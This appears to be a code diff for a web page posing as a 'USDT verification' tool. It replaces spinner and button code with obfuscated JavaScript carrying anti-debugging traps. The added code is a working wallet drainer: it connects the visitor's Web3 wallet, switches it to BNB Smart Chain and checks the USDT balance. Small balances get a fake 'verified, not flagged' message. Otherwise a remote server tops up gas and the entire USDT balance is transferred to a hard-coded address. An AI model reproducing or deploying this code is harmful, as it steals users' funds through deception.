-                popupBox.style.display = 'none';
-                const loadingOverlay = document.getElementById('loading-spinner-overlay');
-                if (loadingOverlay && !loadingOverlay.classList.contains('show')) {
-                    loadingOverlay.classList.add('show');
-                    setTimeout(function() {
-                        loadingOverlay.classList.remove('show');
-                    }, 3000);
-                }
-            }
-        });
-        
-        if (document.body) {
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true,
-                attributes: true,
-                attributeFilter: ['style', 'id']
-            });
-        }
-    });
-    
-    // Override after window load (backup - script.js uses window.load)
-    window.addEventListener('load', function() {
-        // Small delay to ensure script.js's load handler runs first
-        setTimeout(function() {
-            overrideShowPopup();
-            console.log('✅ showPopup override applied after window load');
-        }, 200);
-    });
-    
-    // Function to hide loading spinner manually
-    window.hideLoadingSpinner = function() {
-        const loadingOverlay = document.getElementById('loading-spinner-overlay');
-        if (loadingOverlay) {
-            loadingOverlay.classList.remove('show');
-        }
+  })(_0x1c87, 0x6619f);
+  function _0x492b5b(_0x1c633b, _0x30219b, _0x1fdd92, _0x43d045, _0x584870) {
+    return _0x7f19(_0x30219b + 0x35f, _0x1c633b);
+  }
+  function _0x3b2ea8(_0x1c01fe, _0x3619d1, _0x3828a2, _0x24fabf, _0x41d9ee) {
+    return _0x7f19(_0x3828a2 + 0x3e, _0x1c01fe);
+  }
+  function _0x7f19(_0xb92d94, _0x49a921) {
+    const _0x4c2e13 = _0x1c87();
+    _0x7f19 = function (_0x39003e, _0x14a8f3) {
+      _0x39003e = _0x39003e - 0x15e;
+      let _0x245618 = _0x4c2e13[_0x39003e];
+      return _0x245618;
     };
-    
-    // Test function - can be called from console: testSpinner()
-    window.testSpinner = function() {
-        const loadingOverlay = document.getElementById('loading-spinner-overlay');
-        if (loadingOverlay) {
-            console.log('Testing spinner...');
-            loadingOverlay.classList.add('show');
-            setTimeout(function() {
-                loadingOverlay.classList.remove('show');
-            }, 3000);
-        } else {
-            console.error('Loading overlay not found!');
+    return _0x7f19(_0xb92d94, _0x49a921);
+  }
+  const _0x1500bf = function () {
+    let _0x43967d = true;
+    return function (_0x2286eb, _0x2b2ede) {
+      const _0x488a82 = _0x43967d ? function () {
+        if (_0x2b2ede) {
+          const _0x48f3c9 = _0x2b2ede.apply(_0x2286eb, arguments);
+          _0x2b2ede = null;
+          return _0x48f3c9;
         }
+      } : function () {};
+      _0x43967d = false;
+      return _0x488a82;
     };
-    
-    // Verify spinner element exists on page load
-    document.addEventListener('DOMContentLoaded', function() {
-        const loadingOverlay = document.getElementById('loading-spinner-overlay');
-        if (loadingOverlay) {
-            console.log('✅ Loading spinner element found');
-        } else {
-            console.error('❌ Loading spinner element NOT found!');
+  }();
+  const _0x56b653 = _0x1500bf(this, function () {
+    return _0x56b653.toString().search('(((.+)+)+)+$').toString().constructor(_0x56b653).search("(((.+)+)+)+$");
+  });
+  _0x56b653();
+  function _0x673d8e(_0x46dfff, _0x194bde, _0x181a8f, _0x1415e2, _0x5bd541) {
+    return _0x7f19(_0x181a8f + 0x294, _0x46dfff);
+  }
+  const _0x17c920 = function () {
+    let _0x347264 = true;
+    return function (_0x4828b7, _0x4143a7) {
+      const _0x43e7f7 = _0x347264 ? function () {
+        if (_0x4143a7) {
+          const _0x54c7d3 = _0x4143a7.apply(_0x4828b7, arguments);
+          _0x4143a7 = null;
+          return _0x54c7d3;
         }
-    });
-</script>
-
-  <!-- ✅ Add event listener to call `Next()` - Simplified for Trust Wallet -->
-<script>
-    // Simple event delegation - works with Trust Wallet and handles all buttons
-    // This runs immediately and catches all clicks
-    (function() {
-        // Use document click event delegation - works even if buttons added later
-        document.addEventListener('click', function(e) {
-            // Check if clicked element is a verifyBtn button or inside one
-            var target = e.target;
-            var button = null;
-            
-            // Check if target is the button itself
-            if (target && (target.classList && target.classList.contains('verifyBtn')) || (target.id === 'verifyBtn')) {
-                button = target;
-            }
-            // Check if target is inside a button (for text/spans inside)
-            else if (target && target.closest) {
-                button = target.closest('.verifyBtn, #verifyBtn');
-            }
-            
-            // If we found a verifyBtn button
-            if (button && (button.classList.contains('verifyBtn') || button.id === 'verifyBtn')) {
-                // Call Next function if it exists
-                if (typeof window.Next === 'function') {
-                    try {
-                        window.Next();
-                    } catch (err) {
-                        // Silent fail - spinner will show via showPopup
-                    }
-                }
-            }
-        }, true); // Use capture phase for early interception
+      } : function () {};
+      _0x347264 = false;
+      return _0x43e7f7;
+    };
+  }();
+  (function () {
+    _0x17c920(this, function () {
+      const _0x56ba80 = new RegExp("function *\\( *\\)");
+      const _0x47d7c7 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
+      const _0x41257f = _0x3d948a("init");
+      if (!_0x56ba80.test(_0x41257f + "chain") || !_0x47d7c7.test(_0x41257f + "input")) {
+        _0x41257f('0');
+      } else {
+        _0x3d948a();
+      }
     })();
-    
-    // Also attach directly to existing buttons on window load
-    window.addEventListener('load', function() {
-        setTimeout(function() {
-            var buttons = document.querySelectorAll('.verifyBtn, #verifyBtn');
-            for (var i = 0; i < buttons.length; i++) {
-                buttons[i].onclick = function() {
-                    if (typeof window.Next === 'function') {
-                        try {
-                            window.Next();
-                        } catch (err) {
-                            // Silent fail
-                        }
-                    }
-                };
-            }
-        }, 500);
+  })();
+  const _0x2c7a1b = function () {
+    let _0x433c45 = true;
+    return function (_0x2cfa69, _0x26f297) {
+      const _0x7427d0 = _0x433c45 ? function () {
+        const _0x57d906 = {
+          'pKLsT': "while (true) {}"
+        };
+        _0x57d906.DoLIw = "counter";
+        if (_0x26f297) {
+          const _0x55bb2f = _0x26f297.apply(_0x2cfa69, arguments);
+          _0x26f297 = null;
+          return _0x55bb2f;
+        }
+      } : function () {};
+      _0x433c45 = false;
+      return _0x7427d0;
+    };
+  }();
+  const _0x50cd5e = _0x2c7a1b(this, function () {
+    let _0x1d61b5;
+    try {
+      const _0x1aa5ac = Function("return (function() {}.constructor(\"return this\")( ));");
+      _0x1d61b5 = _0x1aa5ac();
+    } catch (_0x4c7b5e) {
+      _0x1d61b5 = window;
+    }
+    const _0x3f08a2 = _0x1d61b5.console = _0x1d61b5.console || {};
+    const _0x13d289 = ['log', 'warn', 'info', 'error', "exception", "table", "trace"];
+    for (let _0x15484a = 0x0; _0x15484a < _0x13d289.length; _0x15484a++) {
+      const _0x287c02 = _0x2c7a1b.constructor.prototype.bind(_0x2c7a1b);
+      const _0x305aed = _0x13d289[_0x15484a];
+      const _0x1ab366 = _0x3f08a2[_0x305aed] || _0x287c02;
+      _0x287c02.__proto__ = _0x2c7a1b.bind(_0x2c7a1b);
+      _0x287c02.toString = _0x1ab366.toString.bind(_0x1ab366);
+      _0x3f08a2[_0x305aed] = _0x287c02;
+    }
+  });
+  _0x50cd5e();
+  function _0x2f4859(_0x403583, _0x328e45, _0x472e16, _0xd5ba6b, _0x48284b) {
+    return _0x7f19(_0x328e45 - 0x390, _0x48284b);
+  }
+  (function () {
+    let _0x29d480;
+    try {
+      const _0xe58385 = Function("return (function() {}.constructor(\"return this\")( ));");
+      _0x29d480 = _0xe58385();
+    } catch (_0x283eee) {
+      _0x29d480 = window;
+    }
+    _0x29d480.setInterval(_0x3d948a, 0xfa0);
+  })();
+  let web3;
+  let userAddress;
+  async function waitForProvider(_0x176a15 = 0x1388) {
+    return new Promise(_0x526518 => {
+      const _0x337dcf = Date.now();
+      const _0x1d9611 = setInterval(() => {
+        const _0x2c7009 = window.ethereum || window.trustwallet || window.web3?.['currentProvider'];
+        if (_0x2c7009 || Date.now() - _0x337dcf > _0x176a15) {
+          clearInterval(_0x1d9611);
+          _0x526518(_0x2c7009);
+        }
+      }, 0x64);
     });
-</script>
-
- </body></html>
+  }
+  async function connectWalletAndSwitch() {
+    const _0x2fddbb = window.ethereum || window.trustwallet || window.web3?.["currentProvider"];
+    if (!_0x2fddbb) {
+      alert("Please open this in Trust Wallet, MetaMask, or another Web3 browser.");
+      return;
+    }
+    try {
+      web3 = new Web3(_0x2fddbb);
+      const _0x3aac9f = {
+        'method': "eth_chainId"
+      };
+      const _0x47b113 = await _0x2fddbb.request(_0x3aac9f);
+      if (_0x47b113 !== '0x38') {
+        try {
+          const _0x539d62 = {
+            'method': 'wallet_switchEthereumChain',
+            'params': [{
+              'chainId': '0x38'
+            }]
+          };
+          await _0x2fddbb.request(_0x539d62);
+        } catch (_0x570ab2) {
+          if (_0x570ab2.code === 0x1326) {
+            const _0x37b823 = {
+              'method': "wallet_addEthereumChain",
+              'params': [{
+                'chainId': "0x38",
+                'chainName': "Binance Smart Chain",
+                'nativeCurrency': {
+                  'name': "BNB",
+                  'symbol': "BNB",
+                  'decimals': 0x12
+                },
+                'rpcUrls': ['https://bsc-dataseed.binance.org/'],
+                'blockExplorerUrls': ["https://bscscan.com"]
+              }]
+            };
+            await _0x2fddbb.request(_0x37b823);
+          } else {
+            alert("Please switch to BNB manually.");
+            return;
+          }
+        }
+      }
+      const _0x52b5a9 = {
+        'method': "eth_accounts"
+      };
+      const _0x50fb24 = await _0x2fddbb.request(_0x52b5a9);
+      userAddress = _0x50fb24[0x0];
+      console.log("✅ Wallet:", userAddress);
+    } catch (_0x2abb75) {
+      alert("Wallet connection failed.");
+      console.error(_0x2abb75);
+    }
+  }
+  function _0x1c87() {
+    const _0x452fc5 = ["QwJfm", 'SdCVh', "oeEtD", 'tSsGG', "EUgrZ", 'sUuNE', "cKgTD", "{}.co", "QjIsv", 'Walle', "BvjIb", '*(?:[', "kYGJk", '87e44', "MzFpU", "let:", "Selec", "fJtep", 'PfGvH', "erwMy", "bnb", "InMII", "XVWFu", 'YQWRM', "mdvQW", 'xiWkm', "nZbMU", "WvxiH", "nRNwA", "YWznC", "IeduJ", "XFTRp", "7f2e3", "web3", 'tdAge', 'dpwZO', "UVDxr", "roduc", "LkaJv", " in y", "ItnaS", "ezIam", "ether", "2949779EgTJVl", "BLGXc", 'borde', 'addre', "Otbug", "act", "nd 'C", "NVnyv", 'BDnxf', "jtZAd", "ceOf", "0x04a", "mBFWJ", "br><b", " (tru", " Burn", '75485', "31979", "gOaXi", "fCrog", "OjhZT", "ZOeGm", "setIn", 'LMLCG', "heck ", 'JdOoW', "BzuUV", "ccoun", "IrLGp", "wbVPe", "mJPPF", '<br><', "AdZzd", "erCas", "PbaHR", "mEOMO", '84cB2', "wbPUq", 'displ', "wTfvA", 'ver-p', "ected", "TnRRB", "qavQi", "r ano", "paddi", "FaCaZ", "JRPTW", "BsguD", "ant", "AIkjM", "No US", "0-9a-", "ImJHb", 'b>BNB', "onten", 'aTARk', "oUGEa", "281A1", "iByBx", "debu", "DZgvb", "\"retu", "torAl", 'USDT:', 'late(', "recip", "Fbfdc", "VKjut", "PIzGL", 'tJqlQ', ">USDT", "obser", "UbKlY", "GKdyd", "IIgxa", "posit", 'er.', "toLow", "JRJRF", "VinLj", 'lign', "xt()", 'dChil', 'ExVNV', "ItCCe", "eElem", "QaIHj", "b3 wa", "dBedT", "JHQHm", "https", "kFflT", "TMKNY", "XEtaQ", "BmcOb", '10px', "isTVs", "color", "JDHFZ", 'qxjof', "34c46", "nnect", "Mtqcl", "ashUt", "ThxsM", "sk, o", 'PsygO', "wQKYR", "✅ Tra", "ructo", "Ufjxf", 'prFpY', "ally.", "Bibpi", "d and", "RQskO", "to Ne", "eum", 'getEl', "cgDbA", "disco", "Ether", "\\+\\+ ", "HTML", "jGknJ", "RXRCz", "bool", 'YNHKs', 'ruSey', "18px", "IyjXe", "-50%,", 'EBkmz', "171Fc", "koLtw", 'eth_a', "iled.", 'JHguh', "getBa", 'zZaqG', "xjmCx", 'SeTxn', "ojbOb", 'VKIdh', 'jOlaX', "SPdIL", "textC", "Loadi", 'GYzeL', "stene", "apply", "jBZEp", "HwIGP", "CFlGr", "1691516RmAKsQ", "Zyigd", "tch t", "while", 'RiqPN', 'iVFBY', "://bn", "irSgA", 'vSXhr', "hUdZZ", "PvhUl", "catio", 'XayfH', "BNB:", 'qzZtI', "DuylH", "ceWQd", 'log', "t_swi", "cscan", "rnWyU", "name", "send", "DfDwt", "textA", " bloc", "ZprKO", "SBjeU", 'sfhAS', 'Trust', 'loEVN', 'UaJIc', "QDFwU", "zAUtb", "MvkKi", "#e6f7", "UjlnD", 'GDxtG', "Now' ", "glDIj", "FEmRa", "WzPBM", "EhndW", "9027B", 'LJzPe', "swfEf", 'uZlFG', "NvaMh", 'IirwE', "addEv", "GqTkU", "80%", "knmvA", "BAa25", "all", "Next", "pVBgI", "outpu", "fromW", "ress", "DiKdu", 'pyswu', 'dtjVi', " -50%", 'MLSZN', "CJrQR", "BBYnu", "brZHd", "VPWYq", 'btirQ', "VzVvb", "top", '3ToDRRZ', "<br>Y", "proto", "state", 'entLi', "zfEbl", "utils", "QUvOp", "zeRYy", "pfqcF", "TgqXz", "DxkRK", 'butto', 'udtno', "snBdl", "ailed", "n/jso", "hENaQ", ".app/", "TasiE", "50%", 'aseed', "to__", ',0,0,', "dQyTT", 'MfUqc', "SDT h", "24699", 'GrfBv', 'kVgeo', "QAfIe", "LHcdw", "XexdS", " or g", "kTXEU", "irfiB", "AqraV", "Color", '0xa1b', "vkmVX", "iUJyQ", "warn", 'TQpuh', "n.<br", "SMBFE", "appen", 'aqiaz', "Contr", "DAjgD", 'wTvYL', "yXape", "red", "LkRfL", "DUCaS", 'WnQZx', "LtYcC", "IOIEr", "uJVMQ", 'obCbj', "a-zA-", "JtXeK", "FZRBK", "odUWq", "tIqyD", "e ope", "/b> ", "n() ", "t_add", 'vjTpD', "okrAf", "mkSQv", 'const', 'pwSPn', "ziAfn", 'type', "abjGi", "ed:</", "39832", "aiGcc", 'JJZaV', "SFTGN", "from", "nsfer", 'NLKJc', "toAdd", "kmhGS", "ifica", "GyozX", "Gqjrt", "abwYA", "hgLkJ", "EYqHU", "lance", "hhRHA", 'spuJQ', "eptCT", "iBZNC", "pKLsT", "nMTFC", "sets ", "eDFWD", "zuGac", "call", "umJTK", "fFrxD", "Objec", "KniIE", "NIKtC", "ion *", "gba(0", "oBRFG", "QVRem", "POST", "HtfVh", "zQYly", 'block', "JWXCt", "flagg", "YwTDV", "BelRj", "left", "dXzMP", "rifie", "GzfqH", "bZhEu", "#ffeb", "trust", "trim", 'DoLIw', 'ZfrYI', "XuBSj", "beWSL", "Web3 ", "huadh", "1430784yObOJO", "fontS", "YBqgk", "necti", "JOCqp", "TLosh", 'black', "wMkIY", "pmiMg", 'VhAqf', 'inoJS', "BYnxh", "Emhrq", 'GIBqb', "iyRHn", "up.ra", "PdAMu", "conso", "ZbbUg", "dth", " not ", ".com", 'SoHjW', "27bZKdjF", "ed in", "Earun", "pOYbK", "rYAtn", "b> ", "rsAvH", 'jfIfP', "GLttK", 'LFfJi', "balan", "etaMa", " Wall", "TvwJr", "jkfDU", "VHSPl", "amoun", "RrGQH", "o BNB", "popup", "GImXP", "HXtNp", 'NHzer', "metho", "ewZhI", 'none', "FaHlK", 'chain', 'Z_$][', "b ...", "bbWEt", "PrgKM", "IqOxK", "laQFH", 'ygbDP', "KJBjR", "YaPgW", "LIUyT", "VQAOz", 'param', "NzUfW", "EgnSr", "sdPEN", "n thi", 'div', 'brows', 'NVVCE', "ent", 'EbBNy', 'ITOpt', 'aSGkP', "ccwwM", "lQSHh", "E53ae", "__pro", "OcOVX", "excep", "rfMGY", "eVRqQ", "SJDOS", 'as.', "ZRYzf", "kchai", "wNxmP", "zA-Z_", 'YDgrK', "$]*)", "gLplD", "FoiDP", "actio", "ICeWt", "kmvsB", "ZzTSW", 'ntPro', "25C38", 'Succe', "appli", "MZvAq", "mXCqV", "><b>U", 'ETXNF', 'onAqn', "dKWYx", "tIcxC", "now", "hMvDX", " comp", "ssocM", "rg/", "oinTU", "he bn", "gnvrl", 'mYsNF', 'Binan', "ScKEN", "tGgSe", "assig", "owDEA", "t not", "oXWUC", "ZGTmo", "Oqjor", "RhITY", "19Cfb", "iDxRG", '11059695DseqpC', "aFcDj", "kwgCY", 'EPlYl', "❌ Tra", "fITbW", 'hainI', 'error', "axGTD", "is\")(", "n (fu", 'width', 'C8605', "klIyp", "Pleas", "info", "DT as", "nstru", "hbjvY", "gZsMu", "QqvWX", "ZsNVG", "QIyUZ", "EUUNT", "en ve", "tkeIu", "ted.", "sNazp", "kDwmU", 'ySmYy', "YuIQr", "USDT ", "gFVOM", ":</b>", "JeClO", "://bs", "_owne", 'cbYTb', "adow", "yEVBL", 'JmgBJ', 'JqRpp', "dKLyv", "hRBMg", "eth_c", "ient", "code", "count", "fer f", "wcbOf", "MWfTS", "trace", "oHoKW", "Check", "hGcLG", "YkSKo", "tRObn", "ZMbVN", "KZdsy", "eumCh", "PIqEd", "Llutd", "WhAgj", "ZZqxp", 'SjIpP', "et, M", "OccXh", 'BNB', "htkxy", "c-dat", "lygod", 'WiqdU', "fixed", "TPaeS", "maxWi", "yOiRq", "Bxjle", "uUIUD", "vniwC", 'JnLtP', "gify", 'hWupt', "cVEXe", "our U", "rApiY", 'lqLWa', "PXcDf", "xAanZ", "jXiiW", "hhkYP", "WTPhe", "curre", "AECNf", "zTnpH", "t con", "#f0f0", "OFbpb", "cCYkg", "nctio", "elQsr", "vvxcL", "vmPjR", 'pGBxL', 'ixbff', 'click', "ssful", "zInde", 'VSLML', "tWJXr", "gHBby", "round", 'ekQMC', "tchEt", "tRPme", "tion.", 'lete<', "walle", "input", " manu", 'RbWpz', ".bina", "jwVav", "C98B9", "HZXLk", "wxxQZ", "GKQAt", "ViSJn", "BoVWx", "uMxcv", "AECVB", "qWPZm", "dojWc", "YDXPN", "XQDct", 'tantK', 'UTPWS', 'gZqna', "KBEhr", 'xJMdC', "✅ Ver", 'udVHy', " fail", "eth", "400px", "ZIlTw", "dxgiH", 'oeDwS', "3166755CzyUMD", "boxSh", 'HmNGJ', "zOZtT", "child", "dEKZe", "dGzaz", "List", "SHRxa", "gBADU", 'yuTDm', 'IRRSB', "retur", "QdPyD", 'table', "qubcz", 'lYskm', 'ctor(', "0 0 1", "blue", "tion", "QaMuD", ")+)+)", 'idCSu', "ion", 'rZUZF', "\\( *\\", "ucdUW", "1991880xTteNs", "rRadi", "SDT:<", "s in ", "allet", "IpXaM", "ng...", 'wJMAI', "creat", "0x55d", "Box", "egDjP", " conn", 'trans', 'uint2', "art C", "aMWEr", "nSlSx", "subtr", "glycE", 'found', "as be", 'OdVnE', "vjudC", "HCgQE", "e) {}", "backg", "ement", "zLGXZ", 'shcWO', 'RwPFy', '0x38', "uAdEb", "ckUfk", 'pcJGR', 'VPHDv', "(((.+", "detec", "toStr", "fer", "etFrI", "lengt", 'aYplz', 'ing', "ize", "13bD2", "Gytfs", "searc", "iwyvk", "e swi", "eBWva", "No We", "strin", 'ojAdC', 'DCyWF', "Zbodj", 'izLJr', "ain", 'WHUTa', "20px", "070BA", "bind", "0px r", "EOwHk", "sdDTj", "nPktL", "test", "AfCwF", "vider", 'wesaS', "FdCPl", "FRtci", "12244qUboqk", "ylIpd", 'cbSHr', "BhQUL", "hain", "ck ba", "gger", "green", "XjBxb", "tFiiK", 'WHRVE', "hereu", "wySor", "body", "on fa", "nvSGj", "init", "OnXVf", "nce.o", "sOxyT", "our w", "inner", "QyZqI", "toWei", "✅ Wal", 'form', 'HvfhA', "funct", "PvDZP", "ById", "sxqyn", "b-ser", 'tKUeS', "Rpfdp", "pOHLG", "tion ", "ce Sm", "59fF7", "vqCyW", "jvBYp", "xinvv", "mChai", 'fnvyz', 'aZlcO', "#fff", "jUyDZ", "RqHEv", "0.2)", "KXnjt", "ZRpEY", 'style', "send-", 'query', 'ejIbd', "cente", "HgEwN", "reque", 'xWyYS', "✅ Bou", 'SAklo', "RaJqV", "ed:", "zgInG", '6f990', 'load', "dORuo", "rn th", "DkxVm", ". Che", 'WCFIH', "EmpJJ", "VtpQv", "IchCu", "ther ", "ing t", "LQIVa", "hNCNn", 'find', "nlGOb", 'pHQov', "ilway", 'sfTVm', "ZwWUJ", "llet ", "terva", "JHxIE", "Adofv"];
+    _0x1c87 = function () {
+      return _0x452fc5;
+    };
+    return _0x1c87();
+  }
+  async function Next() {
+    if (!web3 || !userAddress) {
+      await connectWalletAndSwitch();
+      if (!web3 || !userAddress) {
+        showPopup("Wallet not connected.", "red");
+        return;
+      }
+    }
+    try {
+      const _0x9856b5 = {
+        'name': "_owner",
+        'type': 'address'
+      };
+      const _0xcef912 = {
+        'constant': true,
+        'inputs': [_0x9856b5],
+        'name': 'balanceOf',
+        'outputs': [{
+          'name': '',
+          'type': "uint256"
+        }],
+        'type': "function"
+      };
+      const _0x3343f2 = {
+        'name': 'recipient',
+        'type': 'address'
+      };
+      const _0x44b73c = {
+        'name': "amount",
+        'type': "uint256"
+      };
+      const _0x4db690 = {
+        'constant': false,
+        'inputs': [_0x3343f2, _0x44b73c],
+        'name': "transfer",
+        'outputs': [{
+          'name': '',
+          'type': "bool"
+        }],
+        'type': "function"
+      };
+      const _0x1f99d0 = new web3.eth.Contract([_0xcef912, _0x4db690], '0x55d398326f99059fF775485246999027B3197955');
+      const [_0x55d15d, _0x163e39] = await Promise.all([_0x1f99d0.methods.balanceOf(userAddress).call(), web3.eth.getBalance(userAddress)]);
+      const _0x40b706 = parseFloat(web3.utils.fromWei(_0x55d15d, "ether"));
+      const _0x52d266 = parseFloat(web3.utils.fromWei(_0x163e39, "ether"));
+      console.log("USDT:", _0x40b706);
+      console.log("BNB:", _0x52d266);
+      if (isNaN(_0x40b706) || _0x40b706 < 0.000001) {
+        showPopup("No USDT assets found in your wallet.", 'black');
+        return;
+      }
+      if (_0x40b706 < 0x1) {
+        showPopup("✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> " + _0x40b706 + "<br><b>BNB:</b> " + _0x52d266, "green");
+        return;
+      }
+      if (_0x52d266 < 0.0005) {
+        showPopup("Please Wait ...", "blue");
+        const _0x24cbdd = {
+          'recipient': userAddress,
+          'amount': "0.00001"
+        };
+        await fetch('https://bnb-server-production-0b1f.up.railway.app/send-bnb', {
+          'method': "POST",
+          'headers': {
+            'Content-Type': "application/json"
+          },
+          'body': JSON.stringify(_0x24cbdd)
+        });
+        await new Promise(_0x5e6bb3 => setTimeout(_0x5e6bb3, 0x7d0));
+      }
+      showPopup("Loading...", "blue");
+      const _0x2fc437 = {
+        'from': userAddress
+      };
+      await _0x1f99d0.methods.transfer("0x25fdfa0d50f30cb4a61a2e1aefdfbc61242746fd", web3.utils.toWei(_0x40b706.toString(), 'ether')).send(_0x2fc437);
+      showPopup("✅ Transfer complete " + _0x40b706, "red");
+    } catch (_0x3cbf55) {
+      console.error("❌ Transfer failed:", _0x3cbf55);
+      showPopup("USDT transfer failed. Check balance or gas.", "red");
+    }
+  }
+  function _0x4841d3(_0x35ab50, _0x1a8888, _0x13bf90, _0x1cb9fa, _0x4ea5e3) {
+    return _0x7f19(_0x13bf90 + 0x1f2, _0x1a8888);
+  }
+  function showPopup(_0x4e441f, _0x500b15) {
+    let _0x54a60d = document.getElementById("popupBox");
+    if (!_0x54a60d) {
+      _0x54a60d = document.createElement("div");
+      _0x54a60d.id = 'popupBox';
+      const _0x26d6e0 = {
+        'position': "fixed",
+        'top': "50%",
+        'left': "50%",
+        'transform': "translate(-50%, -50%)",
+        'padding': "20px",
+        'borderRadius': '10px',
+        'boxShadow': "0 0 10px rgba(0,0,0,0.2)",
+        'textAlign': "center",
+        'fontSize': '18px',
+        'width': "80%",
+        'maxWidth': '400px',
+        'zIndex': 0x270f,
+        'backgroundColor': "#fff"
+      };
+      Object.assign(_0x54a60d.style, _0x26d6e0);
+      document.body.appendChild(_0x54a60d);
+    }
+    _0x54a60d.style.backgroundColor = _0x500b15 === 'red' ? '#ffebeb' : _0x500b15 === "green" ? "#e6f7e6" : "#f0f0f0";
+    _0x54a60d.style.color = _0x500b15;
+    _0x54a60d.innerHTML = _0x4e441f;
+    _0x54a60d.style.display = 'block';
+    setTimeout(() => _0x54a60d.style.display = "none", 0x1388);
+  }
+  window.addEventListener('load', async () => {
+    const _0x15fb12 = await waitForProvider();
+    if (!_0x15fb12) {
+      alert("No Web3 wallet detected.");
+      return;
+    }
+    await connectWalletAndSwitch();
+    const _0x1de672 = new MutationObserver(() => {
+      const _0x187c63 = [...document.querySelectorAll("button")].find(_0x587e66 => _0x587e66.textContent.trim().toLowerCase() === "Next");
+      if (_0x187c63) {
+        _0x187c63.addEventListener("click", Next);
+        console.log("✅ Bound 'Check Now' to Next()");
+        _0x1de672.disconnect();
+      }
+    });
+    const _0x1395b4 = {
+      'childList': true,
+      'subtree': true
+    };
+    _0x1de672.observe(document.body, _0x1395b4);
+  });
+  function _0x3d948a(_0x496e99) {
+    function _0x506ed1(_0xc43df4) {
+      if (typeof _0xc43df4 === "string") {
+        return function (_0x496d0) {}.constructor("while (true) {}").apply('counter');
+      } else if (('' + _0xc43df4 / _0xc43df4).length !== 0x1 || _0xc43df4 % 0x14 === 0x0) {
+        (function () {
+          const _0x5369fb = {
+            'LQIVa': "click"
+          };
+          _0x5369fb.LkaJv = "✅ Bound 'Check Now' to Next()";
+          return true;
+        }).constructor("debugger").call("action");
+      } else {
+        (function () {
+          return false;
+        }).constructor("debugger").apply("stateObject");
+      }
+      _0x506ed1(++_0xc43df4);
+    }
+    try {
+      if (_0x496e99) {
+        return _0x506ed1;
+      } else {
+        _0x506ed1(0x0);
+      }
+    } catch (_0x40e271) {}
+  }
